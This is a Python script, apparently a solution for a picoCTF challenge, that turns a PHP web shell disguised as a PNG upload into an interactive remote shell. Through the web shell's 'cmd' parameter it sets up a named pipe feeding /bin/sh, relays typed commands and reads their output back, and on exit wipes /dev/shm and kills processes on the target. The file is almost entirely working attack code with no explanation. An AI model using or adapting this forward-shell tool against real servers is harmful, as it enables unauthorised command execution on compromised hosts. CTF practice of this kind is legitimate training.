#!/urs/bin/env python3

import time
import requests
import signal
import sys
from base64 import b64encode
from termcolor import colored
from random import randrange
from urllib.parse import quote


global main_url
global input_file
global output_file

main_url = "http://atlas.picoctf.net:50580/uploads/index_MOD.png.php"
input_file = f"/dev/shm/{randrange(1000, 9999)}.input"
output_file = f"/dev/shm/{randrange(1000, 9999)}.output"


def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo.......", 'red'))
    requests.get(main_url, params={'cmd': '/bin/rm /dev/shm/* ; pkill f'}, timeout=1)
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def write_and_read_comand(command):
    status_code = 1
    
    data = {  'cmd': f'echo {command}  >{input_file} ' 

  }

    requests.get(main_url, params=data, timeout=1)


    data = {  'cmd': '/bin/cat %s' %(output_file) }  
    r = requests.get(main_url, params=data, timeout=2)

    return  r.text.strip()

    requests.get(main_url, params={'cmd': 'echo " " > %s' %(output_file)}, timeout=1)
    




if  __name__ == '__main__' :

    data = {
           'cmd': 'mkfifo %s; tail -f %s | /bin/sh > %s 2>&1 &' %(input_file, input_file, output_file)
          }

    requests.get(main_url, params=data, timeout=1)

    #r=requests.get(main_url, params={'cmd' : 'echo "$?"'}, timeout=1)


    while True :

        command = input(colored(f" >", 'yellow'))
        output_comand = write_and_read_comand(command)
        print(f"{output_comand}\n")



